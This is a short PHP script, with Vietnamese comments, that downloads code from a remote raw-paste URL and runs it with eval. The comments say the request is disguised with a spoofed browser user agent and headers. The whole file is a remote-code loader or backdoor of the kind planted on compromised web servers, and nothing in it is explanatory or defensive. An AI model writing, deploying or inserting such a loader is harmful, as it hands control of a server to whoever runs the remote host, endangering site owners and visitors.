<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bujang.online/raw/8UrLm8v7Kd");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Thiết lập thời gian timeout
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); // Ngụy trang user agent
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html',
    'Accept-Language: en-US,en;q=0.9'
]); // Thêm header HTTP để ngụy trang yêu cầu
$output = curl_exec($ch);
curl_close($ch);

// Thực thi nội dung
eval("?>".$output);
?>
